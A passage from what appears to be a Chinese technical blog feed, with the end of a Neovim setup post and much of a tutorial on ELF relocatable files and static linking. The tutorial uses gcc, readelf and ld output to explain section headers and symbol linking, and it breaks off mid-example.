href="https://neovim.io/doc/user/nvim.html#nvim-from-vim">https://neovim.io/doc/user/nvim.html#nvim-from-vim</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt install neovim</span><br><span class="line">mkdir -p ~/.config/nvim/</span><br><span class="line">touch init.vim    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nvim init.vim</span><br><span class="line">:exe <span class="string">&#x27;edit &#x27;</span>.stdpath(<span class="string">&#x27;config&#x27;</span>)<span class="number">.&#x27;</span>/init.vim<span class="number">&#x27;</span></span><br><span class="line">:write ++p</span><br></pre></td></tr></table></figure><p>复制到init.vim</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> runtimepath^=~/.vim runtimepath+=~/.vim/after</span><br><span class="line">let &amp;packpath = &amp;runtimepath</span><br><span class="line">source ~/.vimrc</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cd ~/.local/share/nvim</span><br><span class="line">ln -s ~/.vim/plugged/ ./plugged</span><br></pre></td></tr></table></figure><p>创建个符号链接vi启动nvim</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cd /usr/bin</span><br><span class="line">sudo rm vi</span><br><span class="line">sudo ln -s nvim vi</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ELF静态链接(ELF Static link)</title>
      <link href="/2023/04/28/static-link/"/>
      <url>/2023/04/28/static-link/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF-Static-link"><a href="#ELF-Static-link" class="headerlink" title="ELF Static link"></a>ELF Static link</h1><p><img src="/2023/04/28/static-link/image-20230428222115232.png" alt="image-20230428222115232"></p><p>之前在elf文件解析时只是做了一下可执行文件elf从执行的视角看了如何依靠Program Header table加载到内存区执行的过程，这次补个从链接的视角看可重定位elf文件如何依靠Section Header table做静态链接成为可执行文件的</p><p>?????????????????????????????????????????丑小鸭变天鹅????????????????????????????????????</p><p>Program Header table其实就是把一些section看成一块</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -l xxx.so</span><br><span class="line"></span><br><span class="line">Elf file type is <span class="title function_">DYN</span> <span class="params">(Shared object file)</span></span><br><span class="line">Entry point 0x420</span><br><span class="line">There are 7 program headers, starting at offset 52</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  LOAD           0x000000 0x00000000 0x00000000 0x00678 0x00678 R E 0x1000</span><br><span class="line">  LOAD           0x000efc 0x00001efc 0x00001efc 0x0011c 0x00124 RW  0x1000</span><br><span class="line">  DYNAMIC        0x000f08 0x00001f08 0x00001f08 0x000e0 0x000e0 RW  0x4</span><br><span class="line">  NOTE           0x000114 0x00000114 0x00000114 0x00024 0x00024 R   0x4</span><br><span class="line">  GNU_EH_FRAME   0x0005b4 0x000005b4 0x000005b4 0x0002c 0x0002c R   0x4</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br><span class="line">  GNU_RELRO      0x000efc 0x00001efc 0x00001efc 0x00104 0x00104 R   0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00     .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .eh_frame_hdr .eh_frame</span><br><span class="line">   01     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss</span><br><span class="line">   02     .dynamic</span><br><span class="line">   03     .note.gnu.build-id</span><br><span class="line">   04     .eh_frame_hdr</span><br><span class="line">   05</span><br><span class="line">   06     .init_array .fini_array .jcr .dynamic .got</span><br></pre></td></tr></table></figure><p>可以看的只有前面两个lOAD类型块是被加载的到内存，其余都是辅助信息，通过下面的 Section to Segment mapping可以看出是把多个section当成一块加载到内存</p><blockquote><p>这样做应该是为了减少一些空间碎片,因为映射是按照页大小来的。有太多的section不足一个页大小，会浪费空间，但是我们操作系统只关心section权限，所以把相同权限的section当成一个整体去映射</p></blockquote><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc --version</span><br><span class="line">gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609</span><br><span class="line">Copyright (C) 2015 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure><p>中间会穿插一点11.3.0版本 just a little bit</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/nemu [SIGINT]&gt; gcc --version</span><br><span class="line">gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0</span><br><span class="line">Copyright (C) 2021 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure><p>工具主要是GNU Binutils  <a href="https://www.gnu.org/software/binutils/">https://www.gnu.org/software/binutils/</a> </p><p>以32位程序为例</p><h2 id="编译漫谈"><a href="#编译漫谈" class="headerlink" title="编译漫谈"></a>编译漫谈</h2><p>从古老的传说hello world说起。。。。。。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚开始大部分人初学时基本上都是直接集成环境的ide一键编译运行，慢慢开始用一些编译工具，gcc,make等，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc test2.c</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; ./a.out</span><br><span class="line">hello world⏎</span><br></pre></td></tr></table></figure><p>但是gcc帮我们做的远比我们想象的多的多</p><p>gcc提供给了我们一个选项来看显示编译和链接具体过程</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">verbose</span><br><span class="line">    Enable showing the tree dump <span class="keyword">for</span> each statement.</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc --verbose test2.c</span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/lto-wrapper</span><br><span class="line">Target: x86_64-linux-gnu</span><br><span class="line">Configured with: ../src/configure -v --with-pkgversion=<span class="string">&#x27;Ubuntu 5.4.0-6ubuntu1~16.04.12&#x27;</span> --with-bugurl=file:<span class="comment">///usr/share/doc/gcc-5/README.Bugs --enable-languages=c,ada,c++,java,go,d,fortran,objc,obj-c++ --prefix=/usr --program-suffix=-5 --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-gnu-unique-object --disable-vtable-verify --enable-libmpx --enable-plugin --with-system-zlib --disable-browser-plugin --enable-java-awt=gtk --enable-gtk-cairo --with-java-home=/usr/lib/jvm/java-1.5.0-gcj-5-amd64/jre --enable-java-home --with-jvm-root-dir=/usr/lib/jvm/java-1.5.0-gcj-5-amd64 --with-jvm-jar-dir=/usr/lib/jvm-exports/java-1.5.0-gcj-5-amd64 --with-arch-directory=amd64 --with-ecj-jar=/usr/share/java/eclipse-ecj.jar --enable-objc-gc --enable-multiarch --disable-werror --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu</span></span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (Ubuntu <span class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>buntu1~<span class="number">16.04</span><span class="number">.12</span>)</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-v&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/cc1 -quiet -v -imultiarch x86_64-linux-gnu test2.c -quiet -dumpbase test2.c -mtune=generic -march=x86<span class="number">-64</span> -auxbase test2 -version -fstack-protector-strong -Wformat -Wformat-security -o /tmp/ccZSA6XB.s</span><br><span class="line">GNU C11 (Ubuntu <span class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>buntu1~<span class="number">16.04</span><span class="number">.12</span>) version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (x86_64-linux-gnu)</span><br><span class="line">        compiled by GNU C version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>, GMP version <span class="number">6.1</span><span class="number">.0</span>, MPFR version <span class="number">3.1</span><span class="number">.4</span>, MPC version <span class="number">1.0</span><span class="number">.3</span></span><br><span class="line">GGC heuristics: --param ggc-min-expand=<span class="number">100</span> --param ggc-min-heapsize=<span class="number">131072</span></span><br><span class="line">ignoring nonexistent directory <span class="string">&quot;/usr/local/include/x86_64-linux-gnu&quot;</span></span><br><span class="line">ignoring nonexistent directory <span class="string">&quot;/usr/lib/gcc/x86_64-linux-gnu/5/../../../../x86_64-linux-gnu/include&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;...&quot;</span> search starts here:</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;...&gt;</span> search starts here:</span></span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/include</span><br><span class="line"> /usr/local/include</span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/include-fixed</span><br><span class="line"> /usr/include/x86_64-linux-gnu</span><br><span class="line"> /usr/include</span><br><span class="line">End of search <span class="built_in">list</span>.</span><br><span class="line">GNU C11 (Ubuntu <span class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>buntu1~<span class="number">16.04</span><span class="number">.12</span>) version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (x86_64-linux-gnu)</span><br><span class="line">        compiled by GNU C version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>, GMP version <span class="number">6.1</span><span class="number">.0</span>, MPFR version <span class="number">3.1</span><span class="number">.4</span>, MPC version <span class="number">1.0</span><span class="number">.3</span></span><br><span class="line">GGC heuristics: --param ggc-min-expand=<span class="number">100</span> --param ggc-min-heapsize=<span class="number">131072</span></span><br><span class="line">Compiler executable checksum: <span class="number">8087146</span>d2ee737d238113fb57fabb1f2</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-v&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"> as -v -<span class="number">-64</span> -o /tmp/ccyxTcBb.o /tmp/ccZSA6XB.s</span><br><span class="line">GNU assembler version <span class="number">2.26</span><span class="number">.1</span> (x86_64-linux-gnu) using BFD version (GNU Binutils <span class="keyword">for</span> Ubuntu) <span class="number">2.26</span><span class="number">.1</span></span><br><span class="line">COMPILER_PATH=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/</span><br><span class="line">LIBRARY_PATH=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../../lib/:/lib/x86_64-linux-gnu/:/lib/../lib/:/usr/lib/x86_64-linux-gnu/:/usr/lib/../lib/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../:/lib/:/usr/lib/</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-v&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/lto-wrapper -plugin-opt=-fresolution=/tmp/ccvOb2eL.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --sysroot=/ --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> -z relro /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/crt1.o /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/crtbegin.o -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span> -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../.. /tmp/ccyxTcBb.o -lgcc --as-needed -lgcc_s --no-as-needed -lc -lgcc --as-needed -lgcc_s --no-as-needed /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/crtend.o /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/crtn.o</span><br></pre></td></tr></table></figure><p>tmd，这合理吗? 哈，这很合理!</p><p>尝试着去看一下，会发现一些我们原本熟悉的东西</p><p>刚开始输出了一些我们gcc的版本信息等</p><p>熟悉的cc1去做预处理并对预处理过的文件做编译(不知道为什么没有看见cpp去做预处理的身影)，这一步是本身就极其复杂的，语法树什么的，更别提代码优化等等，具体的东西可能要去补补编译原理 ps:这学期给自己挖的坑够多了，只能下次一定</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/cc1 -quiet -v -imultiarch x86_64-linux-gnu test2.c -quiet -dumpbase test2.c -mtune=generic -march=x86<span class="number">-64</span> -auxbase test2 -version -fstack-protector-strong -Wformat -Wformat-security -o /tmp/ccZSA6XB.s</span><br></pre></td></tr></table></figure><p>打印出他搜索头文件的路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ignoring nonexistent directory &quot;/usr/local/include/x86_64-linux-gnu&quot;</span><br><span class="line">ignoring nonexistent directory &quot;/usr/lib/gcc/x86_64-linux-gnu/5/../../../../x86_64-linux-gnu/include&quot;</span><br><span class="line">#include &quot;...&quot; search starts here:</span><br><span class="line">#include &lt;...&gt; search starts here:</span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/5/include</span><br><span class="line"> /usr/local/include</span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/5/include-fixed</span><br><span class="line"> /usr/include/x86_64-linux-gnu</span><br><span class="line"> /usr/include</span><br><span class="line">End of search list.</span><br></pre></td></tr></table></figure><p>as 汇编器去做汇编，就是机械的翻译汇编到机器码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">as -v --64 -o /tmp/ccyxTcBb.o /tmp/ccZSA6XB.s</span><br></pre></td></tr></table></figure><p>后面从<code> /usr/lib/gcc/x86_64-linux-gnu/5/collect2</code>到最后<code>/x86_64-linux-gnu/crtn.o</code>都是在用collect2做链接 collect2是ld链接器的一个封装</p><p>我们要这次要研究的就是ld究竟怎么做的链接，怎么把多个可能互相引用的可重定位文件链接成一个可执行文件的</p><h2 id="重生之我是linker"><a href="#重生之我是linker" class="headerlink" title="重生之我是linker"></a>重生之我是linker</h2><p>把自己想象成linker，我们有的是可重定位目标文件，我们要把他变为可执行文件,首先要对有编译器和汇编器生成的可重定位目标文件做个了解，编译器给了他什么，如果什么都没有我们linker凭什么或者说何德何能把他变为可执行目标文件</p><p>linker: ?什么都没有?不好意思我做不到!</p><h3 id="Relocatable-object-file"><a href="#Relocatable-object-file" class="headerlink" title="Relocatable object file"></a>Relocatable object file</h3><p>ELF里的一些定义符号</p><pre><code>The following types are used for  N-bit  architectures  (N=32,64,  ElfNstands for Elf32 or Elf64, uintN_t stands for uint32_t or uint64_t):ElfN_Addr       Unsigned program address, uintN_tElfN_Off        Unsigned file offset, uintN_tElfN_Section    Unsigned section index, uint16_tElfN_Versym     Unsigned version symbol information, uint16_tElf_Byte        unsigned charElfN_Half       uint16_tElfN_Sword      int32_tElfN_Word       uint32_tElfN_Sxword     int64_tElfN_Xword      uint64_t</code></pre><p> simple_section.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_init_var = <span class="number">84</span>;</span><br><span class="line"><span class="type">int</span> global_uninit_var;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> global_static_var;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> reference_to_out;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var = <span class="number">85</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var2;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line"></span><br><span class="line">    func1(static_var + static_var2 + a + b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc -m32 -c simple_section.c</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; file simple_section.o</span><br><span class="line">simple_section.o: ELF <span class="number">32</span>-bit LSB relocatable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), not stripped</span><br></pre></td></tr></table></figure><p>ELF文件，链接我们依靠的是他的section head table ，linker哪里找到他呢?</p><p>ELF header里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT   16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT]; <span class="comment">/* ELF文件标识 */</span></span><br><span class="line">    Elf32_Half      e_type;             <span class="comment">/* 文件类型 */</span></span><br><span class="line">    Elf32_Half      e_machine;          <span class="comment">/* 机器类型 */</span></span><br><span class="line">    Elf32_Word      e_version;          <span class="comment">/* 文件版本 */</span></span><br><span class="line">    Elf32_Addr      e_entry;            <span class="comment">/* 程序入口地址 */</span></span><br><span class="line">    Elf32_Off       e_phoff;            <span class="comment">/* 程序头表偏移 */</span></span><br><span class="line">    Elf32_Off       e_shoff;            <span class="comment">/* 节头表偏移 */</span></span><br><span class="line">    Elf32_Word      e_flags;            <span class="comment">/* 文件标志 */</span></span><br><span class="line">    Elf32_Half      e_ehsize;           <span class="comment">/* ELF头大小 */</span></span><br><span class="line">    Elf32_Half      e_phentsize;        <span class="comment">/* 程序头表项大小 */</span></span><br><span class="line">    Elf32_Half      e_phnum;            <span class="comment">/* 程序头表项数量 */</span></span><br><span class="line">    Elf32_Half      e_shentsize;        <span class="comment">/* 节头表项大小 */</span></span><br><span class="line">    Elf32_Half      e_shnum;            <span class="comment">/* 节头表项数量 */</span></span><br><span class="line">    Elf32_Half      e_shstrndx;         <span class="comment">/* 节头表字符串表索引 */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p><code>e_shoff</code>(section header table offset)给出了在文件里的偏移，e_shnum，e_shentsize节头表项大小和数量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; readelf -h simple_section.o</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              REL (Relocatable file)</span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x0</span><br><span class="line">  Start of program headers:          0 (bytes into file)</span><br><span class="line">  Start of section headers:          868 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           0 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         13</span><br><span class="line">  Section header string table index: 10</span><br></pre></td></tr></table></figure><p>看一下各个section</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">There are 13 section headers, starting at offset 0x364:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .text             PROGBITS        00000000 000034 000062 00  AX  0   0  1</span><br><span class="line">  [ 2] .rel.text         REL             00000000 0002cc 000028 08   I 11   1  4</span><br><span class="line">  [ 3] .data             PROGBITS        00000000 000098 000008 00  WA  0   0  4</span><br><span class="line">  [ 4] .bss              NOBITS          00000000 0000a0 000008 00  WA  0   0  4</span><br><span class="line">  [ 5] .rodata           PROGBITS        00000000 0000a0 000004 00   A  0   0  1</span><br><span class="line">  [ 6] .comment          PROGBITS        00000000 0000a4 000036 01  MS  0   0  1</span><br><span class="line">  [ 7] .note.GNU-stack   PROGBITS        00000000 0000da 000000 00      0   0  1</span><br><span class="line">  [ 8] .eh_frame         PROGBITS        00000000 0000dc 000064 00   A  0   0  4</span><br><span class="line">  [ 9] .rel.eh_frame     REL             00000000 0002f4 000010 08   I 11   8  4</span><br><span class="line">  [10] .shstrtab         STRTAB          00000000 000304 00005f 00      0   0  1</span><br><span class="line">  [11] .symtab           SYMTAB          00000000 000140 000110 10     12  12  4</span><br><span class="line">  [12] .strtab           STRTAB          00000000 000250 000079 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>section head table可以理解为一个Elf32_Shdr结构体的数组 Elf32_Shdr结构来描述具体的section属性</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word  sh_name;        <span class="comment">// 节名称在 .shstrtab 节中的索引</span></span><br><span class="line">    Elf32_Word  sh_type;        <span class="comment">// 节类型</span></span><br><span class="line">    Elf32_Word  sh_flags;       <span class="comment">// 节标志</span></span><br><span class="line">    Elf32_Addr  sh_addr;        <span class="comment">// 节的内存地址</span></span><br><span class="line">    Elf32_Off   sh_offset;      <span class="comment">// 节在文件中的偏移量</span></span><br><span class="line">    Elf32_Word  sh_size;        <span class="comment">// 节的大小（字节数）</span></span><br><span class="line">    Elf32_Word  sh_link;        <span class="comment">// 链接到的其他节的索引</span></span><br><span class="line">    Elf32_Word  sh_info;        <span class="comment">// 额外信息</span></span><br><span class="line">    Elf32_Word  sh_addralign;   <span class="comment">// 对齐方式</span></span><br><span class="line">    Elf32_Word  sh_entsize;     <span class="comment">// 节包含实体的大小</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><strong>sh_name</strong></p><p>节名称在 .shstrtab 节中的索引， .shstrtab是节头表字符串表索引</p><p>具体来看下我们例子的 .shstrtab是的name是怎么解析的，linker首先从elf header里得到.shstrtab在section head table的第十个section e_shoff+e_shstrndx*e_shentsize&#x3D;904+10*40&#x3D;1304&#x3D;0x508,找到这个section的描述结构体</p><p><img src="/2023/04/28/static-link/image-20230428232104339.png" alt="image-20230428232104339"></p><p>前四个字节就是sh_name在.shstrtab 节中的索引，找到sh_offset为0x0328，即为shstrtab 节在文件中的位置，加上sh_name这个索引0x0328+0x11&#x3D;0x339</p><p><img src="/2023/04/28/static-link/image-20230428232706551.png" alt="image-20230428232706551"></p><p>就可以找到这个名字</p><p>之所以要这样这样存储名字，是因为我们的ELF必须要有一个对所有文件固定的格式，但是名字往往是不固定的长度，如果直接存储这个字符串，就不能用一个统一的结构体去描述，存储索引完美解决</p><p><strong>sh_type</strong></p><p>决定了节的类型 SHT_SYMTAB，SHT_RELA，SHT_DYNAMIC，SHT_REL等</p><p><strong>sh_flags</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SHF_WRITE     This section  contains  data  that  should  be writable during process execution.</span><br><span class="line"></span><br><span class="line">SHF_ALLOC      This  section  occupies  memory during process execution. Some  control  sections  <span class="keyword">do</span> notreside  in the memory image of an object file. This attribute is off <span class="keyword">for</span> those sections.表示该节在进程空间里要分配内存，有些节是一些控制信息不会被加载到进程空间，一般代码段数据段，和.bss段都会有这个表示，另外一些节完成任务之后就扔了尼，嘿嘿</span><br><span class="line"></span><br><span class="line">SHF_EXECINSTR  This  section  contains   executable   machineinstructions.</span><br><span class="line"></span><br><span class="line">SHF_MASKPROC   All  bits  included  in this mask are reserved <span class="keyword">for</span> processor-specific semantics.</span><br></pre></td></tr></table></figure><p><strong>sh_link</strong>和<strong>sh_info</strong>只有节的类型是与链接相关时才会有用</p><p><img src="/2023/04/28/static-link/image-20230429003128446.png" alt="image-20230429003128446"></p><p><strong>sh_entsize</strong></p><p>有一些节的内容是一张表，其中每一个表项的大小是固定的，比如符号表。 对于这种表来说，本成员指定其每一个表项的大小。</p><h3 id="static-link"><a href="#static-link" class="headerlink" title="static link"></a>static link</h3><p><strong>a.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> shared;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">6</span>;</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>b.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> shared = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span> &#123;</span><br><span class="line">    *a ^= *b ^= *a ^= *b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; gcc -m32 -fno-<span class="built_in">stack</span>-protector -c a.c b.c</span><br><span class="line">a.c: In function ‘main’:</span><br><span class="line">a.c:<span class="number">6</span>:<span class="number">5</span>: warning: implicit declaration of function ‘swap’ [-Wimplicit-function-declaration]</span><br><span class="line">     swap(&amp;a, &amp;shared);</span><br><span class="line">     ^</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; ld -m elf_i386 a.o b.o -e main -o  ab</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; file a.o b.o ab</span><br><span class="line">a.o: ELF <span class="number">32</span>-bit LSB relocatable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), not stripped</span><br><span 